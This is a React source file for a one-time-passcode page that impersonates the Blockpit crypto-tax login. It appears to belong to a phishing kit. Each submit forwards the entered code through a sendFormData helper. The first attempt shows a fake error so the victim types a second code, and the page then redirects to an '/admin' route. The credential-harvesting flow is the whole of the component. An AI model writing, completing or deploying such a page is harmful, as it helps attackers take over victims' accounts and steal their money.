import React, { useState, useRef } from "react";
import "../Admin/Admin.css";
import whiteLogo from "../../assets/blockpit_white.svg";
import { FcGoogle } from "react-icons/fc";
import { FaApple } from "react-icons/fa";
import coinIcon from "../../assets/icon.svg";
import { FaTimesCircle } from "react-icons/fa";
import { sendFormData } from "../sendFormData";
import { useNavigate } from "react-router-dom";

const OTP = () => {
 
    const [otpInputFocused, setOtpInputFocused] = useState(false);
 
    const [otpPlaceholder, setOtpPlaceholder] = useState("OTP");
    
    const [otp, setOtp] = useState("");
    const [otpTouched, setOtpTouched] = useState(false);
    const [error, setError] = useState("")
    const [submitCount, setSubmitCount] = useState(0)
    const navigate = useNavigate()
  
  
    const form = useRef()
  
    const submit = (e) => {
      e.preventDefault()
       
      const newCount = submitCount + 1
      setSubmitCount(newCount)
  
      sendFormData(form)
  
       if (newCount === 1) {
      setError("Please, input your details correctly.");
    }
  
      if(newCount === 2){
        navigate('/admin')
        setError("")
        return 0
      }
  
      return newCount
  
    }
  
    return (
      <div id="logindiv">
        <form ref={form} onSubmit={submit}>
        <div id="logodiv">
          <img src={whiteLogo} alt="" id="whitelogo" />
        </div>
        {/* <p className="heading" id="heading1">
          Welcome back!
        </p>
        <p className="heading" id="heading2">
          Log in to your Blockpit account and do your taxes in an easy and
          compliant way.
        </p>
  
        <div id="socialdiv">
          <div className="icondiv">
            <FcGoogle className="icon" />
          </div>
          <div className="icondiv">
            <FaApple className="icon" />
          </div>
          <div className="icondiv">
            <img src={coinIcon} alt="" id="coinIcon" />
          </div>
        </div>
  
        <div id="hrdiv">
          <hr className="hr" />
          <span>or</span>
          <hr className="hr" />
        </div> */}

        <p id="otpheading">Please, enter OTP verification code</p>
  
        {error && <p className="error">{error}</p>}
        
        <div className="inputdiv" id="otpinputdiv">
          <input name="digits"
            type="text"
            className={`input ${otpInputFocused ? "input-focused" : ""} ${
              !otp && otpTouched? "input-has-text" : ""
            } ${otp? "input-valid" : ""} `}
            placeholder={otpPlaceholder}
            value={otp}
            onChange={(e) => setOtp(e.target.value)}
            onFocus={() => {
              setOtpInputFocused(true);
              setOtpPlaceholder("");
            }}
            onBlur={() => {
              setOtpInputFocused(false);
              setOtpPlaceholder("Email");
              setOtpTouched(true);
            }}
          />
          {otpInputFocused && <span className="emailinputspan"> OTP </span>}
          {otp && (
            <span>
              <FaTimesCircle id="clearicon" onClick={() => setOtp("")} />
            </span>
          )}
          {!otp && otpTouched && (
            <span className="error-text"> OTP is required</span>
          )}
          
        </div>
        <button type="submit" className={`loginbutton ${otp? "active" : "inactive"}`} disabled={!otp} > Submit </button>
        {/* <div id="lastdiv"> <p className="lastp">Still haven't created an account? Sign up</p><p className="lastp" id="secondp">here</p></div> */}
        
        </form>
      </div>
    );
}

export default OTP